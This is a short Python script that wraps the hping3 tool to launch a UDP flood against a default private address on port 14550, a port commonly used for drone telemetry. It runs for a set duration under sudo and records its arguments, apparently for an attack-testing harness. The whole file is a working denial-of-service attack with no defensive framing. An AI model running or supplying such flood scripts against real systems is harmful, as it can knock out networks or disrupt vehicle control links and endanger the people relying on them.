import subprocess
import signal
import os
import time

def hping_udp_flood(ip="192.168.13.14", port=14550, duration=60, execution_record=None):
    if execution_record:
        execution_record["arguments"] = {
            "ip": ip,
            "port": port,
            "duration": duration
        }
    """
    Wraps the hping3 command to perform a UDP flood.
    Note: Requires sudo/root privileges.
    """
    print(f"Starting hping3 UDP flood on {ip}:{port}...")
    
    # Construct the command
    # --udp: UDP mode
    # -p: Target port
    # --flood: Sent packets as fast as possible, don't show replies
    # -d: data size (optional, hping default is 0)
    cmd = ["sudo", "hping3", "--udp", "-p", str(port), "--flood", ip]
    
    try:
        # Start the process in a new process group so we can kill it easily
        process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
        
        # Let it run for the specified duration
        time.sleep(duration)
        
        # Terminate the process
        print(f"\nStopping hping3 after {duration} seconds.")
        process.terminate()
        process.wait(timeout=5)
        
    except PermissionError:
        print("Error: This script requires sudo privileges to run hping3.")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    hping_udp_flood()